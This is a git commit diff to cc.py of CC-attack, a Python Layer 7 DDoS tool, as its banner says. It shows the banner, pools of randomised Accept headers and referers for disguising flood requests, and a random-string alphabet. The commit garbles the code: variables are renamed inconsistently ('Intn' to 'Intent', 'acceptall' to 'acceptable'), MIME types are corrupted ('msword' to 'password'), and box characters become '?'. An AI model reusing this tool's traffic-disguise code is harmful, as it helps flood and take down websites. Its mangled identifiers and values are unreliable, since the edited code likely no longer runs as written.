aad20a195b0e8969e465ba50dd29caa087526f4d
nestor <dani088813@gmail.com>
2021-09-24 18:55:46 -0500

    Update cc.py

--- cc.py
+++ cc.py
@@ -18,33 +18,33 @@ import datetime
 
 print ('''
 	   /////    /////    /////////////
-	  CCCCC/   CCCCC/   | CC-attack |/
+	  FCC/   FCC/   | CC-attack |/
 	 CC/      CC/       |-----------|/ 
 	 CC/      CC/       |  Layer 7  |/ 
 	 CC/////  CC/////   | ddos tool |/ 
-	  CCCCC/   CCCCC/   |___________|/
+	  FCC/   FCC/   |___________|/
 >--------------------------------------------->
 Version 3.6 (2020/12/19)
 							C0d3d by L330n123
-┌─────────────────────────────────────────────┐
-│        Tos: Don't attack .gov website       │
-├─────────────────────────────────────────────┤
-│                 New stuff:                  │
-│          [+] Optimization                   │
-│          [+] Changed Output                 │
-│          [+] Added Url Parser               │
-├─────────────────────────────────────────────┤
-│ Link: https://github.com/Leeon123/CC-attack │
-└─────────────────────────────────────────────┘''')
+???????????????????????????????????????????????
+?        Tos: Don't attack .gov website       ?
+???????????????????????????????????????????????
+?                 New stuff:                  ?
+?          [+] Optimization                   ?
+?          [+] Changed Output                 ?
+?          [+] Added Url Parser               ?
+???????????????????????????????????????????????
+? Link: https://github.com/Leeon123/CC-attack ?
+???????????????????????????????????????????????''')
 
-acceptall = [
+acceptable = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
 		"Accept-Encoding: gzip, deflate\r\n",
 		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
 		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
 		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
-		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pope, application/x-ms-xbap, application/x-shockwave-flash, application/password, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
 		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
 		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
 		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
@@ -54,7 +54,7 @@ acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
 		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
 
-referers = [
+referrers = [
 	"https://www.google.com/search?q=",
 	"https://check-host.net/",
 	"https://www.facebook.com/",
@@ -83,9 +83,9 @@ referers = [
 ind_dict = {}
 data = ""
 cookies = ""
-strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
+strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLuzin1234567890&"
 ###################################################
-Intn = random.randint
+Intent = random.randint
 Choice = random.choice
 ###################################################
 def build_threads(mode,thread_num,event,socks_type,ind_rlock):
